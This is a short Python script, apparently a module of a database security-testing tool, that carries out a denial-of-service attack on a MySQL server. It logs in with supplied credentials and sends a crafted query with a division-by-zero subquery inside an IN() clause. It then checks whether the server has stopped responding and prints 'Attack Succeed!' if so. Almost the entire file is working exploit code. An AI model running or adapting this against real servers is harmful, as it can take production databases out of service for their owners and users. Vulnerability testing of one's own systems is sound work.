# coding:utf-8

import mysql.connector


class mysql_dos1:
    def __init__(self):
        pass

    def setDBInfo(self, db):
        # print db
        self.dbip = db[1]
        self.dbname = db[8]
        self.dbpwd = db[9]

    def pro(self):
        self.connectDB()

    def connectDB(self):

        config = {'host': self.dbip, 'user': self.dbname, 'password': self.dbpwd, 'port': 3306}

        self.mysql = None
        try:
            self.mysql = mysql.connector.connect(**config)
        except mysql.connector.Error as e:
            print "Connection Failed!{}".format(e)
        if self.mysql.is_connected():
            print 'Mysql Connection Successed!'

        self.cur = self.mysql.cursor()
        try:
            self.cur.execute("use mysql")
            self.cur.execute("SELECT id from example WHERE id IN(1, (SELECT IF(1=0,1,2/0))); ")
        except mysql.connector.Error as e:
            # print "Connection Failed!{}".format(e)
            pass
        print 'Attack sent!'

        try:
            print self.cur.fetchall()
        except mysql.connector.Error as e:
            # print "Connect Failed!{}".format(e)
            pass

        print 'Now the database should be out of service.'

        try:
            self.cur.execute("select 1 from dual")
        except mysql.connector.Error as e:
            print "execute 'select 1 from dual' "
            print "Connection Failed!{}".format(e)
            print "Attack Succeed!"
